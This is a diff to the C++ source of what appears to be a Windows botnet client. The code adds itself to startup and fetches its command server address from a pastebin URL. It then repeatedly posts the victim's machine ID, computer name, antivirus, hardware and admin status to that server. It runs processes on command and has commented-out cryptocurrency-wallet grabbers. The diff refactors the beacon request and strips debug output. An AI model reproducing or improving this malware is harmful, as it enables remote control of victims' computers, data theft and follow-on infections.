@@ -26,7 +26,12 @@
 
 
 
-
+struct ComInit
+{
+	HRESULT hr;
+	ComInit() : hr(::CoInitialize(nullptr)) {}
+	~ComInit() { if (SUCCEEDED(hr)) ::CoUninitialize(); }
+};
 
 std::string encryptDecrypt(std::string toEncrypt) {
 	Config config;
@@ -59,9 +64,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 			Helpers::addstartup();
 		}
 
-		std::cout << OsHelpers::checkPEIsAdmin();
-		std::cout << OsHelpers::PrcessorArchitecture();
 
+		
 		//Fetch Gate from raw Site
 		http::Request request(config.pastebinUrl);
 		http::Response response = request.send("GET");
@@ -75,24 +79,27 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 		//std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
 		//std::thread t2(&CoinFinder::grabEthereum, CoinFinder());
 		//Main
+		std::string guid = Helpers::GetMachineGUID();
+		std::string args = "hwid=" + guid +
+			"&username=" + encryptDecrypt(Helpers::getComputerName()) +
+			"&nf2=" + encryptDecrypt(netFramework2) +
+			"&nf3=" + encryptDecrypt(netFramework3) +
+			"&nf35=" + encryptDecrypt(netFramework35) +
+			"&nf4=" + encryptDecrypt(netFramework4) +
+			"&av=" + Helpers::getCurrentAv() +
+			"&cpu=" + OsHelpers::getCpuName() +
+			"&gpu=" + OsHelpers::getGpuName() +
+			"&ram=" + OsHelpers::getRam() +
+			"&os=" + Helpers::GetWindowsVersionString() +
+			"&aornot=" + OsHelpers::checkPEIsAdmin() +
+			"&arch=" + OsHelpers::PrcessorArchitecture() +
+			"&botversion=" + encryptDecrypt("2.0");
+
 		while (true) {
 			try {
 				http::Request request2(gateFromPatebin);
 				http::Response respons2e = request2.send("POST",
-					"hwid=" + Helpers::GetMachineGUID() +
-					"&username=" + encryptDecrypt(Helpers::getComputerName()) +
-					"&nf2=" + encryptDecrypt(netFramework2) +
-					"&nf3=" + encryptDecrypt(netFramework3) +
-					"&nf35=" + encryptDecrypt(netFramework35) +
-					"&nf4=" + encryptDecrypt(netFramework4) +
-					"&av=" + Helpers::getCurrentAv() +
-					"&cpu=" + OsHelpers::getCpuName() +
-					"&gpu=" + OsHelpers::getGpuName() +
-					"&ram=" + OsHelpers::getRam() +
-					"&os=" + Helpers::GetWindowsVersionString() +
-					"&aornot=" + OsHelpers::checkPEIsAdmin() +
-					"&arch=" + OsHelpers::PrcessorArchitecture() +
-					"&botversion=" + encryptDecrypt("2.0"),
+					args,
 					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
 				);
 				std::string responseFromGate = Helpers::responseToString(respons2e);
@@ -111,13 +118,13 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 					std::string started = Helpers::startNewProcess(file);
 					http::Request request2(gateFromPatebin);
 					http::Response respons2e = request2.send("POST",
-						"hwid=" + Helpers::GetMachineGUID() +
-						"&username=" + Helpers::getComputerName() +
+						"hwid=" + guid +
 						"&ps=" + started +
 						"&id=" + v[1],
 						{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
 					);
-					std::cout << started;
+					
+					//std::cout << started;
 				}else {
 					if (responseFromGate.find("uninstall") != std::string::npos) {
 						//t1.detach();
@@ -138,6 +145,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 			catch (const std::exception & e) {
 				std::cerr << "Request failed, error: " << e.what() << std::endl;
 			}
+			
 			Sleep(10000);
 		}
+		
 }
